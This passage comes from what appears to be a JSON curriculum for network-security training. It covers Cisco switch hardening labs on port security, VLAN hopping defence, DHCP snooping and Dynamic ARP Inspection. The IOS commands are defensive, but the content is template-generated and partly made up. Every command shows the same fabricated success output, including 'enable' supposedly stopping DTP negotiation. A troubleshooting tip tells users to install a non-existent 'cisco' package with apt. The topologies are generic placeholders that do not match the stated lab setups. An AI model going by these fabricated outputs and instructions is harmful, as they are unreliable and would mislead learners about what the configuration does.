        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 Switch, 2 PCs, 1 Rogue PC",
          "Cisco Packet Tracer",
          "Connecting rogue laptop triggers violati...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "What is the difference between violation modes 'protect', 'restrict', and 'shutdown'?",
        "hint": "Protect drops packets silently; Restrict drops and sends SNMP trap; Shutdown disables port."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Port Security & MAC Layer Defense?",
      "options": [
        "Bind hardware interfaces to specific host identifiers to eliminate access layer spoofing.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Bind hardware interfaces to specific host identifiers to eliminate access layer spoofing."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 18.",
    "eli5Story": {
      "title": "The Guard Dog That Only Knows Your Collar (Port Security Sticky MAC)",
      "analogy": "The network port learns the exact hardware collar (MAC address) of your laptop. If a stranger unplugs your cable and plugs in their own laptop, the port instantly goes to sleep (shutdown)!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 18",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 Switch, 2 PCs, 1 Rogue PC"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 19,
    "week": 10,
    "classNumber": 19,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 10: VLAN Security & DHCP Mitigations",
    "title": "Mitigating VLAN Hopping Attacks",
    "category": "VLAN Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Eliminate frame spoofing parameters that attempt to cross internal trunk borders.",
    "tools": [
      "Cisco Packet Tracer",
      "802.1Q"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 2 Switches, 3 VLANs",
    "topology": {
      "description": "Lab topology for Mitigating VLAN Hopping Attacks",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "VLAN Security",
        "explanation": "Eliminate frame spoofing parameters that attempt to cross internal trunk borders."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Mitigating VLAN Hopping Attacks",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 2 Switches, 3 VLANs.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Mitigating VLAN Hopping Attacks",
        "description": "Turn off Dynamic Trunking Protocol negotiation across all user-facing interfaces (switchport nonegotiate). Change the default native configuration from VLAN 1 to an isolated, unrouted target VLAN ID number. Reassign all inactive interfaces to an isolated 'Black Hole' VLAN and shut them down.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "vlan 999",
            "description": "Execute vlan command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "name BLACKHOLE_UNUSED",
            "description": "Execute name command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "vlan 777",
            "description": "Execute vlan command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "name NATIVE_ISOLATED",
            "description": "Execute name command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "interface range FastEthernet0/10 - 24",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "switchport mode access",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "switchport access vlan 999",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "shutdown",
            "description": "Execute shutdown command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "switchport trunk encapsulation dot1q",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "switchport mode trunk",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "switchport nonegotiate",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "switchport trunk native vlan 777",
            "description": "Execute switchport command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN."
          }
        ],
        "verification": "DTP negotiation stopped; default VLAN 1 is no longer native trunk VLAN.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 2 Switches, 3 VLANs",
          "Cisco Packet Tracer",
          "DTP negotiation stopped; default VLAN 1 ...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How does an attacker exploit double-tagging 802.1Q frames to hop VLANs?",
        "hint": "Outer tag matches native VLAN and is stripped by switch; inner tag routes frame into target VLAN."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Mitigating VLAN Hopping Attacks?",
      "options": [
        "Eliminate frame spoofing parameters that attempt to cross internal trunk borders.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Eliminate frame spoofing parameters that attempt to cross internal trunk borders."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 19.",
    "eli5Story": {
      "title": "The Tall Fences Between the Playgrounds (VLAN Hopping Defense)",
      "analogy": "Kindergarteners belong in Kindergarten, and High Schoolers belong in High School. We lock the gate and turn off automatic fence-moving so nobody can jump over the wall!"
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 19",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 2 Switches, 3 VLANs"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 20,
    "week": 10,
    "classNumber": 20,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 10: VLAN Security & DHCP Mitigations",
    "title": "DHCP Snooping Configuration",
    "category": "LAN Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Filter network broadcasts to stop unauthorized rogue addressing architectures.",
    "tools": [
      "Cisco Packet Tracer",
      "DHCP Snooping"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 Switch, 1 Server, 1 Rogue",
    "topology": {
      "description": "Lab topology for DHCP Snooping Configuration",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "LAN Security",
        "explanation": "Filter network broadcasts to stop unauthorized rogue addressing architectures."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for DHCP Snooping Configuration",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 Switch, 1 Server, 1 Rogue.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: DHCP Snooping Configuration",
        "description": "Globally initiate DHCP Snooping options across consumer communication segments. Explicitly assign the network link pointing to the enterprise core server as a trusted port, while forcing standard edge access lines into an untrusted profile bounded by packet rate limiters.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "ip dhcp snooping",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "ip dhcp snooping vlan 10,20",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "no ip dhcp snooping information option",
            "description": "Execute no command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "ip dhcp snooping trust",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "interface range FastEthernet0/1 - 24",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "ip dhcp snooping limit rate 15",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "show ip dhcp snooping",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          },
          {
            "shell": "cisco",
            "cmd": "show ip dhcp snooping binding",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table."
          }
        ],
        "verification": "Rogue DHCP offer packets on access ports are blocked; valid bindings recorded in table.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 Switch, 1 Server, 1 Rogue",
          "Cisco Packet Tracer",
          "Rogue DHCP offer packets on access ports...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "How does a rogue DHCP server allow an attacker to intercept all outbound client traffic?",
        "hint": "It hands out its own IP as default gateway, routing all traffic through the attacker."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of DHCP Snooping Configuration?",
      "options": [
        "Filter network broadcasts to stop unauthorized rogue addressing architectures.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Filter network broadcasts to stop unauthorized rogue addressing architectures."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 20.",
    "eli5Story": {
      "title": "The Fake Cafeteria Lunch Lady (DHCP Snooping)",
      "analogy": "A rogue computer pretends to be the teacher handing out desk numbers. DHCP Snooping makes sure only the REAL approved teacher is allowed to hand out network addresses."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 20",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 Switch, 1 Server, 1 Rogue"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
      {
        "id": "S4",
        "label": "Detailed evidence of finding or vulnerability flagged"
      },
      {
        "id": "S5",
        "label": "Independent manual verification of the observed risk"
      },
      {
        "id": "S6",
        "label": "Controlled demonstration of security impact"
      },
      {
        "id": "S7",
        "label": "Remediation step execution (hardening/patching)"
      },
      {
        "id": "S8",
        "label": "Post-remediation retest proving the vulnerability is closed"
      }
    ],
    "troubleshootingTable": [
      {
        "problem": "Target host unreachable / ping timeout",
        "cause": "VM network adapters on different subnets or guest firewall dropping ICMP.",
        "fix": "Ensure both VMs are on the same Host-Only or NAT network adapter in hypervisor settings."
      },
      {
        "problem": "Command not found",
        "cause": "Required tool package is not installed or not in system PATH.",
        "fix": "Install required tools using package manager: sudo apt update && sudo apt install -y cisco."
      },
      {
        "problem": "Permission denied during execution",
        "cause": "Executing an administrative command without appropriate sudo permissions.",
        "fix": "Prefix command with 'sudo' if in admin role, or verify account permissions."
      },
      {
        "problem": "Output differs from workbook example",
        "cause": "Software version difference or service not currently running.",
        "fix": "Verify target service status with systemctl or netstat before testing."
      }
    ],
    "assessmentRubric": {
      "totalMarks": 100,
      "criteria": [
        {
          "component": "Requirements, environment isolation and baseline setup",
          "marks": 15
        },
        {
          "component": "Execution of discovery and configuration tasks",
          "marks": 15
        },
        {
          "component": "Accurate detection and verification of findings",
          "marks": 20
        },
        {
          "component": "Controlled demonstration of security implications",
          "marks": 20
        },
        {
          "component": "Remediation implementation and verified retest",
          "marks": 20
        },
        {
          "component": "Documentation, screenshots and reflection quality",
          "marks": 10
        }
      ]
    }
  },
  {
    "id": 21,
    "week": 11,
    "classNumber": 21,
    "phase": 2,
    "phaseTitle": "Phase 2: Network Security & Infrastructure Defense",
    "weekTitle": "Week 11: Spoofing Protections & IP Filtering",
    "title": "Dynamic ARP Inspection (DAI)",
    "category": "LAN Security",
    "difficulty": "Intermediate",
    "duration": "90 - 120 Mins",
    "objective": "Correlate frame addressing logs against network tables to kill packet-redirection threats.",
    "tools": [
      "Cisco Packet Tracer",
      "DAI"
    ],
    "targetEnvironment": "Cisco Packet Tracer: 1 Switch, 1 Router, 2 PCs",
    "topology": {
      "description": "Lab topology for Dynamic ARP Inspection (DAI)",
      "nodes": [
        {
          "id": "source",
          "label": "Cisco Packet Tracer",
          "role": "Operator Station",
          "ip": "192.168.1.50",
          "type": "workstation"
        },
        {
          "id": "target",
          "label": "Cisco",
          "role": "Target / Infrastructure",
          "ip": "192.168.1.100",
          "type": "server"
        }
      ],
      "connections": [
        [
          "source",
          "target",
          "Management / Network Link"
        ]
      ]
    },
    "prerequisites": [
      "Completed previous week exercises",
      "Virtual lab environment running",
      "Authorized testing boundaries verified"
    ],
    "keyConcepts": [
      {
        "title": "LAN Security",
        "explanation": "Correlate frame addressing logs against network tables to kill packet-redirection threats."
      },
      {
        "title": "Defense in Depth",
        "explanation": "Ensuring multiple defensive layers protect the asset rather than relying on a single control."
      }
    ],
    "steps": [
      {
        "stepNumber": 1,
        "title": "Lab Setup & Environment Preparation for Dynamic ARP Inspection (DAI)",
        "description": "Verify system connectivity and tool installation in Cisco Packet Tracer: 1 Switch, 1 Router, 2 PCs.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "enable",
            "description": "Execute enable command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          }
        ],
        "verification": "Environment ready and target accessible.",
        "tip": "Verify network routing and check permissions before executing."
      },
      {
        "stepNumber": 2,
        "title": "Execute Core Hands-on Exercise: Dynamic ARP Inspection (DAI)",
        "description": "Activate Dynamic ARP Inspection routines within target environment VLAN profiles. Map the physical link towards the main perimeter router interface as an explicitly trusted path. Inject a simulated invalid gratuitous ARP stream from an unauthorized node and track drop logs on the switch console.",
        "commands": [
          {
            "shell": "cisco",
            "cmd": "configure terminal",
            "description": "Execute configure command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "ip arp inspection vlan 10",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "interface GigabitEthernet0/1",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "ip arp inspection trust",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "exit",
            "description": "Execute exit command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "interface range FastEthernet0/1 - 24",
            "description": "Execute interface command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "ip arp inspection limit rate 15",
            "description": "Execute ip command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "end",
            "description": "Execute end command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          },
          {
            "shell": "cisco",
            "cmd": "show ip arp inspection vlan 10",
            "description": "Execute show command",
            "output": "[+] Command executed successfully.\nOutput: Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged."
          }
        ],
        "verification": "Rogue gratuitous ARP messages are intercepted and dropped; switch console alerts logged.",
        "tip": "Keep strict logs of all timestamps, commands executed, and artifacts extracted."
      }
    ],
    "dataCollectionTable": {
      "headers": [
        "Target / Endpoint",
        "Artifact / Port",
        "Evidence Observed",
        "Risk / Status"
      ],
      "initialRows": [
        [
          "Cisco Packet Tracer: 1 Switch, 1 Router, 2 PCs",
          "Cisco Packet Tracer",
          "Rogue gratuitous ARP messages are interc...",
          "Documented"
        ]
      ]
    },
    "reflectionQuestions": [
      {
        "q": "Why does Dynamic ARP Inspection depend directly on DHCP Snooping?",
        "hint": "DAI validates ARP IP-to-MAC associations against the DHCP Snooping database table."
      },
      {
        "q": "How would you harden or monitor against this specific activity in an enterprise environment?",
        "hint": "Think about least privilege, centralized logging, and proactive detection rules."
      }
    ],
    "quickQuiz": {
      "question": "What is the primary objective of Dynamic ARP Inspection (DAI)?",
      "options": [
        "Correlate frame addressing logs against network tables to kill packet-redirection threats.",
        "Bypass legal authorizations",
        "Shut down the host operating system without backup",
        "Disable endpoint firewalls permanently"
      ],
      "answer": 0,
      "explanation": "The primary goal is: Correlate frame addressing logs against network tables to kill packet-redirection threats."
    },
    "deliverable": "Submit your technical evidence log, answers to the reflection questions, and completed data table for Class 21.",
    "eli5Story": {
      "title": "The Nametag Inspector at the Front Door (Dynamic ARP Inspection)",
      "analogy": "A bully says: 'Hey everybody, I am the teacher now! Give me your homework!' Dynamic ARP Inspection checks the official school list to kick out anyone lying about their identity."
    },
    "philosophy": "Build it. Find it. Fix it.",
    "learningMethod": "Create -> Baseline test -> Enumerate -> Analyse -> Verify -> Remediate -> Retest",
    "roles": {
      "admin": "labadmin / Defender (Infrastructure configuration & remediation)",
      "trainee": "trainee / Security Auditor (Discovery & validation)"
    },
    "threeWayProof": {
      "title": "The 3-Way Security Comparison Table for Class 21",
      "headers": [
        "Test Executed",
        "Command",
        "Expected Outcome",
        "What it Proves to a Beginner"
      ],
      "rows": [
        [
          "Baseline Test",
          "Standard connection test",
          "Protected / Normal State",
          "The default control is operational under ordinary conditions."
        ],
        [
          "Vulnerability Validation",
          "Testing with Cisco Packet Tracer",
          "Finding / Vulnerability Flagged",
          "Proves the specific weakness can realistically be reached."
        ],
        [
          "Post-Remediation Retest",
          "Rerun validation command",
          "Access Denied / Blocked",
          "Proves the defensive patch successfully stopped the issue!"
        ]
      ]
    },
    "evidenceChecklist": [
      {
        "id": "S1",
        "label": "Baseline configuration of Cisco Packet Tracer: 1 Switch, 1 Router, 2 PCs"
      },
      {
        "id": "S2",
        "label": "Initial reachability and environment validation"
      },
      {
        "id": "S3",
        "label": "Primary discovery scan or execution using Cisco Packet Tracer"
      },
